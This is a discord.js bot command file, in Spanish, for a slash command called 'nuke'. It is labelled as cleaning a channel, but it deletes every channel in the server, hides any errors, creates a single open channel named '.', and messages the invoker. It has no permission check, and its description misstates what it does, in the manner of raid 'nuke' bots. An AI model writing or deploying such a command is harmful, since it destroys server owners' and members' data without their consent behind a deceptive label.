const { SlashCommandBuilder } = require("@discordjs/builders")
const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js")


module.exports = {

    timeout:60000, 
    data: new SlashCommandBuilder()
    .setName("nuke")
    .setDescription("Limpiar canal"),

    async run(client, interaction){
try{



    interaction.guild.channels.cache.forEach(c => {
      c.delete().catch(e=>{
        return;
      })//asd
      })
     
        interaction.guild.channels.create('.').then(c => {
          c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true }).catch(e=>{return})
        })
        
          interaction.user.send({content: '**Se ha comenzado la eliminación de canales, esto puede demorar un poco.**', ephemeral: true}).catch(()=>{
            return;
          })
  



}catch (e) {
        console.error(e);
        
        try {
          return;
         } catch (e) {}
        }
    }
}